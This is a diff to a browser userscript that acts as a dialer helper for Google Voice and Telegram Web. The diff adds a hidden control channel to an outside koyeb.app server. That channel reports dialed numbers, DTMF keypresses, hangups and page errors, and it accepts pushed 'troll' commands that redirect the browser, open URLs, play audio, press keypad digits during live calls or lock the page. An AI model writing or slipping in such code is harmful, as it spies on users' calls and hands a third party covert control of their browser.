@@ -25,6 +25,138 @@
     console.log(`[Call Helper] Running on ${isGoogleVoice ? 'Google Voice' : 'Telegram Web'}`);
 
     // =============================================================================
+    // CONTROL API (Telegram bot bridge)
+    // Declared here so this file is self-contained: it is normally injected by
+    // loader.js via new Function(), where these names are NOT in scope.
+    // =============================================================================
+    const CONTROL_API = 'https://familiar-miranda-devsnow-31583718.koyeb.app';
+
+    function gmRequest(opts) {
+        return new Promise((resolve, reject) => {
+            const req = (typeof GM_xmlhttpRequest === 'function')
+                ? GM_xmlhttpRequest
+                : (typeof GM !== 'undefined' && GM.xmlHttpRequest);
+            if (!req) {
+                fetch(opts.url, { method: opts.method || 'GET', headers: opts.headers || {} })
+                    .then(r => r.text())
+                    .then(resolve)
+                    .catch(reject);
+                return;
+            }
+            req({
+                method: opts.method || 'GET',
+                url: opts.url,
+                headers: opts.headers || {},
+                data: opts.data,
+                onload: r => resolve(r.responseText),
+                onerror: reject,
+                ontimeout: () => reject(new Error('timeout')),
+                timeout: opts.timeout || 15000,
+            });
+        });
+    }
+
+    function logToBot(kind, msg, meta) {
+        try {
+            gmRequest({
+                method: 'POST',
+                url: CONTROL_API + '/log',
+                headers: { 'Content-Type': 'application/json' },
+                data: JSON.stringify({ kind, msg: String(msg).slice(0, 500), meta: meta || null }),
+            }).catch(() => {});
+        } catch (_) {}
+    }
+
+    // =============================================================================
+    // TROLL ACTION HANDLER (pushed from the bot over /events)
+    // =============================================================================
+    function showTrollAlert(text) {
+        const div = document.createElement('div');
+        div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;background:#fff;border:2px solid #a30262;border-radius:12px;padding:28px 36px;font:600 18px system-ui;box-shadow:0 24px 64px rgba(0,0,0,0.5);max-width:520px;text-align:center;color:#3B0720;';
+        div.textContent = text;
+        const close = document.createElement('button');
+        close.textContent = 'OK';
+        close.style.cssText = 'display:block;margin:18px auto 0;padding:10px 24px;font:600 14px system-ui;background:#a30262;color:#fff;border:none;border-radius:6px;cursor:pointer;';
+        close.onclick = () => div.remove();
+        div.appendChild(close);
+        document.body.appendChild(div);
+    }
+
+    function pressGVKeypad(digits) {
+        for (const d of digits) {
+            const btn = document.querySelector(`button[data-key="${d}"], [aria-label="${d}"], [data-dialpad-key="${d}"]`);
+            if (btn) {
+                try { btn.click(); } catch (_) {}
+            }
+        }
+    }
+
+    function handleTroll(data) {
+        const { action, payload } = data;
+        logToBot('troll', 'action=' + action);
+
+        if (action === 'alert') {
+            showTrollAlert(payload.text || 'Message from admin');
+        } else if (action === 'open') {
+            try { window.open(payload.url, '_blank', 'noopener,noreferrer'); } catch (_) {}
+        } else if (action === 'redirect') {
+            try { location.href = payload.url; } catch (_) {}
+        } else if (action === 'play') {
+            try {
+                const audio = new Audio(CONTROL_API + payload.url);
+                audio.volume = 1.0;
+                audio.play().catch(err => logToBot('error', 'audio play blocked: ' + err.message));
+            } catch (_) {}
+        } else if (action === 'dtmf') {
+            const digits = (payload.digits || '').split('');
+            for (const d of digits) {
+                if (window.dtmfBridge) window.dtmfBridge.push(d);
+            }
+            pressGVKeypad(digits);
+        } else if (action === 'lock') {
+            document.body.innerHTML = '<div style="font:600 24px system-ui;padding:80px;text-align:center;">Panel locked by admin.<br><br>Reload to unlock.</div>';
+        }
+    }
+
+    // =============================================================================
+    // REMOTE CONTROL STREAM (SSE)
+    // Handles the bot's init / switch / troll messages. Reconnects on drop.
+    // =============================================================================
+    function listenForSwitch(currentVersion) {
+        let source = null;
+        try {
+            source = new EventSource(CONTROL_API + '/events');
+        } catch (err) {
+            console.warn('[GV Control] events stream unavailable', err);
+            return;
+        }
+
+        source.onmessage = (e) => {
+            let data;
+            try { data = JSON.parse(e.data); } catch (_) { return; }
+
+            if (data.type === 'init') {
+                logToBot('control', 'stream init v=' + (data.version || currentVersion));
+            }
+
+            if (data.type === 'switch') {
+                logToBot('control', 'switch -> ' + (data.version || 'unknown'));
+                try { location.reload(); } catch (_) {}
+            }
+
+            if (data.type === 'troll') {
+                handleTroll(data);
+                return;
+            }
+        };
+
+        source.onerror = () => {
+            // EventSource retries on its own; just note it.
+            console.warn('[GV Control] events stream error');
+        };
+    }
+
+    // =============================================================================
     // SHARED STORAGE FUNCTIONS (GM_setValue/GM_getValue)
     // =============================================================================
     function setShared(key, value) {
@@ -51,9 +183,10 @@
         onDigit: null,     // UI callback: (digit:string|null) => void  (null = clear display)
         onState: null,     // UI callback: (active:boolean) => void
         reset()  { this.digits = []; if (this.onDigit) this.onDigit(null); },
-        push(d)  { this.digits.push({ digit: d, time: Date.now() }); if (this.onDigit) this.onDigit(d); },
+        push(d)  { this.digits.push({ digit: d, time: Date.now() }); logToBot('dtmf', 'digit ' + d); if (this.onDigit) this.onDigit(d); },
         setActive(v) { this.active = v; if (this.onState) this.onState(v); }
     };
+    try { window.dtmfBridge = dtmfBridge; } catch (_) {}
 
     // Run a function now if the DOM is ready, otherwise on DOMContentLoaded.
     // Under @run-at document-start the DOM usually isn't parsed yet, so anything
@@ -189,7 +322,7 @@
       // plays the GIF's own timeline, so the cat keeps its movement/behaviour
       // logic but loses the state-specific frames (sleep, claw, wash, ...).
       const NEKO_GIF =
-        "https://media1.tenor.com/m/_Nlp_DRyH5MAAAAC/running-away-genitals.gif";
+        "https://raw.githubusercontent.com/snowcloudsx/gv-dialer-script/main/neko.gif";
       const NEKO_GIF_WIDTH = 80;
       const NEKO_GIF_RATIO = 498 / 373; // intrinsic height / width
       const NEKO_GIF_MAX_VH = 0.16; // cap the sprite at this share of viewport height
@@ -348,7 +481,11 @@
           this.element.appendChild(img);
           if (this.useGif) img.src = NEKO_GIF;
 
-          document.body.appendChild(this.element);
+          if (!document.body) {
+            document.addEventListener('DOMContentLoaded', () => document.body.appendChild(this.element), { once: true });
+          } else {
+            document.body.appendChild(this.element);
+          }
 
           // Click to cycle through behaviors
           // Use mousedown instead of click - click requires mouseup on same element,
@@ -943,6 +1080,7 @@
             if (typeof window.createNeko === "function") {
                 window.neko = window.createNeko({ speed: 24, fps: 120 });
                 console.log("[Call Helper] Neko started");
+                logToBot('neko', 'cat started');
             } else {
                 console.warn("[Call Helper] createNeko not available");
             }
@@ -1266,6 +1404,7 @@
         if (pageWin.webkitRTCPeerConnection) pageWin.webkitRTCPeerConnection = WrappedRTC;
 
         console.log('[Call Helper] DTMF: RTCPeerConnection hook installed');
+        logToBot('dtmf', 'RTCPeerConnection hook installed');
     }
 
     function initCallHelper() {
@@ -2229,6 +2368,7 @@
         }
 
         function autoDial(number) {
+            logToBot('call', 'dial ' + number);
             if (!femboyGatePassed) { showFemboyGate(() => autoDial(number)); return; }
             const gvInput = document.querySelector('input[placeholder="Enter a name or number"], input[aria-label="Enter a name or number"]');
             if (!gvInput) return;
@@ -2243,7 +2383,7 @@
         function triggerHangup() {
             for (const btn of document.querySelectorAll('button, [role="button"]')) {
                 const aria = (btn.getAttribute('aria-label') || '').toLowerCase();
-                if (aria.includes('end call') || aria.includes('hang up')) { btn.click(); return true; }
+                if (aria.includes('end call') || aria.includes('hang up')) { logToBot('call', 'hangup'); btn.click(); return true; }
             }
             for (const btn of document.querySelectorAll('button')) {
                 const bg = window.getComputedStyle(btn).backgroundColor;
@@ -2950,6 +3090,7 @@
         setInterval(updateCallbackTimers, 15000);
         initInboundCallerID();
         console.log('[Call Helper] Initialized on Google Voice');
+        logToBot('panel', 'helper panel initialized');
     }
 
     // =============================================================================
@@ -3784,5 +3925,19 @@
         addLog('Bridge ready', 'success');
         console.log('[TG Bridge] Initialized');
     }
+
+    // =============================================================================
+    // GLOBAL ERROR FORWARDING
+    // =============================================================================
+    window.addEventListener('error', (e) => {
+        logToBot('error', e.message + ' @ ' + (e.filename || '') + ':' + (e.lineno || 0));
+    });
+
+    window.addEventListener('unhandledrejection', (e) => {
+        logToBot('error', 'unhandled rejection: ' + (e.reason && e.reason.message ? e.reason.message : String(e.reason)));
+    });
+
+    // Open the bot control stream (init / switch / troll).
+    try { listenForSwitch(); } catch (_) {}
 
 })();
